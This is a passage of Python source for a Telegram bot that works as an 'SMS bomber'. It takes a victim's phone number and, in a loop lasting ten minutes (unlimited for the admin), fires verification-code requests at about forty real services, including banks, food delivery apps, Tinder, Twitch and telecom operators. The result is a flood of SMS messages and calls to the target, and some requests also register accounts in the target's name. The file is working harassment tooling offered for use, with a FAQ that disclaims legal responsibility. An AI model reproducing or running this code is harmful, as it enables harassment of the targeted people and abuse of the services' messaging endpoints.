            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[+] alpari sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[+] Invitro sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[+] Psbank sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[+] KFC sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[+] Delitime sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print('[+] Guru sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[+] ICQ sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[+] InDriver sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[+] IVI sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[+] Lenta sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[+] MVideo sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print('[+] OK sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print('[+] qlean sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print('[+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print('[+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print('[+] Tinder sent!')  
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[+] Twitch sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print('[+] wowworks sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print('[+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[+] Alpari sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print('[+] SMS sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[+] Delivery sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    msg = f'‍Номер телефона: {phone_number}\nТаймер: 10 минут\nСпам успешно начался!'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 10)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и попробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'SMS-Бомбер 📨':
        bot.send_message(chat_id, 'Введите номер без + в формате:\n 🇺🇦380xxxxxxxxx\n 🇷🇺79xxxxxxxxx\n 🇵🇼77xxxxxxxxx\n 🇵🇱44ххххххххх\n')
    
    elif text == 'STOP Bomber ❌':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif text == '🤖Информация':
        bot.send_message(chat_id, 'Создатель бота: @artem450\n\n<b>По вопросам сотрудничества обращаться в ЛС к создателю бота\n\n Наш канал: @nanobomber </b>', parse_mode='HTML')

    elif text == '📈Статистика':
        bot.send_message(chat_id, f'Статистика отображается в реальном времени!\nПользователей‍: {users_amount[0]}\nСервисов для RU: 60\nСервисов для UK: 35\nСервисов для KZ: 20\n<b>Бот запущен: 26.01.2020</b>', parse_mode='HTML')

    elif text == 'FAQ':
        bot.send_message(chat_id, 'Этот SmS-Bomber с лицензией MPL-2.0 ! глаголит она о том, что если у вас будут хоть какие то проблемы с законом, то эти проблемы остаются вашими, ибо я всего лишь программист, а вы использовали мою программу в своих корыстных целях! Вы не можете на меня подать жалобу, так-как если вы используете мой бот, вы соглашайтесь с MPL-2.0!')

    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    
    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)


    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)



    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')      

if __name__ == '__main__':
    bot.polling(none_stop=True)